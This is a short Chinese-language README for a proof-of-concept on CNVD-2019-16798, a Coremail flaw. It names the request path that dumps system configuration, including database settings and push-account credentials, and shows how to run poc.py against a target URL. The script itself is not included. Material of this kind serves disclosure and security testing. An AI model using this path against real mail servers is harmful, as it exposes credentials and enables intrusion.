# 漏洞信息
vul_code: cnvd-2019-16798  
name: coremail配置信息泄露
description: 访问Coremain系统的`/mailsms/s?func=ADMIN:appState&dumpConfig=/`路径可以获取到系统配置信息，包含数据库配置、推送账号等信息

# POC
poc.py
**usage**
python2 poc.py http://vul.com